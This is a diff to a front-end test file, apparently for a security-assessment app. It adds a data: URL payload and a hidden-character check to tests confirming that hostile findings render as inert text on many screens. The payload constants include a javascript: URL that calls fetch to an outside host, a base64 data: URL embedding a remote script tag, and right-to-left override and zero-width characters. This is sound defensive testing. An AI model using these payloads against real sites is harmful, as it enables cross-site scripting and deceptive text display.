@@ -20,12 +20,22 @@
  * checks), a scan's decisions (the retest panel), both scan screens (the engine's
  * findings and its notes), the Assurance console (the finding, its closure
  * standing, its remediation history, its incident pack and the pack's export) and
- * the four authority screens (approvals, chains, tool contracts, release gate).
+ * the four authority screens (approvals, chains, tool contracts, release gate) --
+ * and, with the same planted strings, a recovery record (its incident, every
+ * step, its coverage), a scan by its name in the Tests list, and a scan from the
+ * record on the Engagements page.
+ *
+ * The finding's own URL takes three forms: an outside http:// URL, a javascript:
+ * URL and a data: URL.
  *
  * On each screen:
  *   - no element of a tag the payload carries appears from it, no element carries
  *     an on* attribute, and no href is a javascript: URL;
  *   - the payload is on the screen as the characters it is, the long string in full;
+ *   - every right-to-left override or zero-width character in it is drawn marked:
+ *     alone in a box naming its code point (client/src/lib/hiddenChars.ts), or
+ *     written out as "[U+202E]" in a tooltip or label, so the text cannot read
+ *     reordered or hide a character;
  *   - nothing is fetched from the outside host: fetch and XMLHttpRequest are
  *     spied, and so is every element created (an <img> or <iframe> fetches as
  *     soon as it has a src) and every innerHTML written;
@@ -49,7 +59,8 @@ import PentestScan from "@/pages/PentestScan";
 import { queryClient } from "@/lib/queryClient";
 import {
   ASSURANCE_FINDING, incidentPackDownload, mountAssurance, mountFindings, mountOverview, mountRetestPanel, mountRisks, mountScan,
-  recordingFetch, renderAuthorityScreens, requests, standInLayoutApis, type Planted,
+  mountEngagements, mountRecoveryRecords, mountScanList, recordingFetch, renderAuthorityScreens, requests, standInLayoutApis,
+  type Planted,
 } from "./helpers/finding-screens";
 
 vi.mock("@/components/ui/select", async () => {
@@ -99,6 +110,8 @@ const LONG = "A".repeat(200 * 1024);
 const HOSTILE_URL = `${OUTSIDE_LINK}&q=‮​\u0000\uD800#<script>`;
 /** And one that would run if it were ever a link's href. */
 const SCRIPT_URL = `javascript:fetch('http://${OUTSIDE}/x')//‮\u0000`;
+/** And one that would draw the outside host's page, script and all, if it were ever a link's href or a frame's src. */
+const DATA_URL = `data:text/html;base64,${btoa(`<script src="http://${OUTSIDE}/d.js"></script>`)}#\u202E\u200B`;
 
 const hostile = (url: string): Planted => ({ text: `${MARKUP} ${ODD}`, long: LONG, url });
 const ORDINARY: Planted = {
@@ -206,8 +219,52 @@ function reachedOut(): string[] {
   return found;
 }
 
+/**
+ * The characters that hide or reorder text: the bidirectional controls and the zero-width and invisible format
+ * characters. Listed here on their own, not read from the component, so a character it stopped marking is caught.
+ */
+const HIDDEN = /[\u061C\u180E\u200B-\u200F\u202A-\u202E\u2060-\u2064\u2066-\u2069\uFEFF]/;
+
+/**
+ * Every place on the page a hidden character is drawn without its mark: a text node that holds one and is not
+ * alone in its own marked box (`data-hidden-char` naming its code point, class `hidden-char`), or an attribute a
+ * person reads or hears (a tooltip, an aria-label, an alt text, a placeholder) that carries one bare instead of
+ * written out as "[U+202E]". Each would show the text reordered, or with a character no one can see.
+ */
+function unmarkedHidden(): string[] {
+  const found: string[] = [];
+  // Where it is: the element, its two parents, and the nearest test id around it.
+  const where = (element: Element | null) => {
+    const chain: string[] = [];
+    for (let one = element; one !== null && chain.length < 3; one = one.parentElement) {
+      chain.unshift(`${one.localName}${one.classList.length > 0 ? `.${Array.from(one.classList).slice(0, 2).join(".")}` : ""}`);
+    }
+    const named = element?.closest("[data-testid]")?.getAttribute("data-testid");
+    return `${chain.join(" > ")}${named ? ` in [${named}]` : ""}`;
+  };
+  const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
+  for (let node = walker.nextNode(); node !== null; node = walker.nextNode()) {
+    const text = node.nodeValue ?? "";
+    if (!HIDDEN.test(text)) continue;
+    const box = node.parentElement;
+    const code = `U+${text.codePointAt(0)!.toString(16).toUpperCase().padStart(4, "0")}`;
+    const marked = box !== null && text.length === 1 && box.getAttribute("data-hidden-char") === code
+      && box.classList.contains("hidden-char") && box.childNodes.length === 1;
+    if (!marked) found.push(`${where(box)}: ${JSON.stringify(text.slice(0, 24))}`);
+  }
+  for (const element of Array.from(document.body.querySelectorAll("*"))) {
+    for (const name of ["title", "aria-label", "aria-description", "alt", "placeholder"]) {
+      const value = element.getAttribute(name);
+      if (value !== null && HIDDEN.test(value)) found.push(`${where(element)} ${name}=${JSON.stringify(value.slice(0, 40))}`);
+    }
+  }
+  return found;
+}
+
 function expectInert(screen: string, planted: Planted, showsUrl: boolean) {
   expect(payloadElements(), `${screen}: elements or attributes from the payload`).toEqual([]);
+  // One line each, so a failure names every place.
+  expect(unmarkedHidden().join("\n"), `${screen}: a hidden or reordering character drawn without its mark`).toBe("");
   expect(reachedOut(), `${screen}: a request, an element or a script from the payload`).toEqual([]);
   // The payload is on the screen as the characters it is: escaped, never parsed, never dropped.
   const text = document.body.textContent ?? "";
@@ -250,12 +307,15 @@ const SCREENS: Array<{ name: string; url: "copy" | "text" | null; mount: (plante
   { name: "the Penetration testing scan screen", url: null, mount: (planted) => mountScan(PentestScan, planted) },
   { name: "the Assurance console: the finding, its closure, its history and its incident pack", url: "copy", mount: mountAssurance },
   { name: "the authority screens (approvals, chains, tool contracts, release gate)", url: null, mount: renderAuthorityScreens },
+  { name: "a recovery record (its incident, every step, its coverage)", url: null, mount: mountRecoveryRecords },
+  { name: "the Tests list, a scan by its name", url: null, mount: mountScanList },
+  { name: "the Engagements page, a scan from the record by its target", url: "text", mount: mountEngagements },
 ];
 
 // Bounded by its timeout: a screen the long string hung fails here. No wall-clock assertion.
 const BOUND = 60_000;
 
-for (const [kind, url] of [["an outside http:// URL", HOSTILE_URL], ["a javascript: URL", SCRIPT_URL]] as const) {
+for (const [kind, url] of [["an outside http:// URL", HOSTILE_URL], ["a javascript: URL", SCRIPT_URL], ["a data: URL", DATA_URL]] as const) {
   describe(`a hostile finding, whose own URL is ${kind}, renders as inert text`, () => {
     for (const one of SCREENS) {
       it(`on ${one.name}`, async () => {
